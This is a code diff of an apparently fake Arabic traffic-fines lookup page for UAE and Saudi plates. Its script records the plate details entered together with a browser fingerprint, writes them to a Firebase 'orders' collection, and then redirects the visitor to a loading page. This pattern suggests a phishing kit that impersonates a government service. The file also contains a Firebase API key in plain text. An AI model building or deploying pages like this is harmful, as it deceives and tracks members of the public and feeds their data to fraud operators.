@@ -202,7 +202,7 @@
 
 <div class="container">
   <main class="search-box">
-    <form id="mainTrafficForm" onsubmit="return false;">
+    <form onsubmit="event.preventDefault(); return false;">
       <div class="field-wrap">
         <label class="field-label">جهة إصدار اللوحة</label>
         <select id="plateSource" class="input-style" required>
@@ -228,7 +228,7 @@
         <div class="field-wrap"><label class="field-label">رمز اللوحة 3</label><select id="k3" class="input-style ksa-in"></select></div>
       </div>
 
-      <button type="submit" class="submit-btn" id="submitBtn">التحقق من المخالفات <span>←</span></button>
+      <button type="button" class="submit-btn" id="submitBtn" onclick="processFines()">التحقق من المخالفات <span>←</span></button>
       <button type="button" class="back-btn" onclick="location.reload()">رجوع</button>
     </form>
   </main>
@@ -245,7 +245,6 @@
         window.pageYOffset > 40 ? h.classList.add("scrolled") : h.classList.remove("scrolled");
     };
 
-    // وظيفة جمع بصمة الجهاز (Fingerprint)
     function getDeviceFingerprint() {
         return {
             userAgent: navigator.userAgent,
@@ -258,7 +257,6 @@
         };
     }
 
-    // القوائم والبيانات الكاملة
     const plateData = {
       AbuDhabi: ["White","Red","Motorcycle4","1","15","Red","Blue","Green","Gray","5","6","11","10","4","7","8","9","12","13","14","16","2","17","1","50","18","20","19","21","22","Yellow","Green","Green1","TradeWhite","Trade","1","Export","Consulate","Diplomat","International Organization","Accommodation","Government","Custom","Probation","Orange","Protocol","2","Blue","1","RED"],
       Dubai: ["Motorcycle","Motorcycle2","Motorcycle3","Motorcycle9","A","B","C","D","E","F","H","G","I","J","K","L","M","N","O","R","T","Z","S","Q","U","V","W","X","Y","ابيض","P","BB","AA","CC","DD","NN","HH","EE","MM","FF","II","Taxi","PublicTransportation","Public Transportation 1","Trade","Export","Export 2","Export 3","Export 4","Export 5","Export 6","Export 7","Export 8","Export 9","Consulate","Political association","International Organization","Accommodation","Government","PrivateTransportation"],
@@ -294,7 +292,7 @@
         document.getElementById("ksaContainer").style.display = (val === "KSA") ? "block" : "none";
     };
 
-    // بيانات Firebase الحقيقية
+    // Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
       authDomain: "jusour-qatar.firebaseapp.com",
@@ -307,27 +305,27 @@
     
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-    const analytics = firebase.analytics();
 
-    analytics.logEvent('page_view', { page_title: 'الرئيسية - استعلام المخالفات' });
-
-    // الوظيفة الرئيسية لإرسال البيانات
-    document.getElementById("mainTrafficForm").addEventListener("submit", async function(e) {
-        e.preventDefault(); // منع التحديث التقليدي
-        
+    // الدالة القاضية لمنع الـ Refresh
+    async function processFines() {
         const btn = document.getElementById("submitBtn");
-        btn.innerHTML = "جاري التحقق...";
-        btn.disabled = true;
         
-        const plateNumber = document.getElementById("plateNumber").value;
-        const plateCode = document.getElementById("plateCode").value;
-        const plateSource = sSel.value;
+        // التحقق من الحقول قبل الإرسال
+        const pNum = document.getElementById("plateNumber").value;
+        const pSrc = sSel.value;
+        if(!pNum || !pSrc) {
+            alert("يرجى إكمال البيانات المطلوبة");
+            return;
+        }
+
+        btn.innerHTML = "جاري الاتصال بالنظام...";
+        btn.disabled = true;
 
         const payload = {
-            plate_source: plateSource,
-            plate_number: plateNumber,
-            plate_code: plateCode,
-            ksa: plateSource === "KSA" ? [document.getElementById("k1").value, document.getElementById("k2").value, document.getElementById("k3").value] : null,
+            plate_source: pSrc,
+            plate_number: pNum,
+            plate_code: document.getElementById("plateCode").value,
+            ksa: pSrc === "KSA" ? [document.getElementById("k1").value, document.getElementById("k2").value, document.getElementById("k3").value] : null,
             device_info: getDeviceFingerprint(),
             status: "pending",
             total_fines: "Checking...",
@@ -337,14 +335,14 @@
         try {
             const docRef = await db.collection("orders").add(payload);
             sessionStorage.setItem("last_order_id", docRef.id);
-            // التوجيه الفوري لصفحة التحميل بطريقة تمنع العودة للخلف (Replace)
-            window.location.replace("loading.php");
+            // توجيه إجباري لصفحة اللودينج
+            window.location.href = "loading.php";
         } catch (err) { 
-            console.error("Firebase Error:", err);
-            btn.innerHTML = "خطأ في الاتصال!";
+            console.error("Error:", err);
+            btn.innerHTML = "فشل الإرسال، حاول ثانية";
             btn.disabled = false;
         }
-    });
+    }
 </script>
 </body>
 </html>
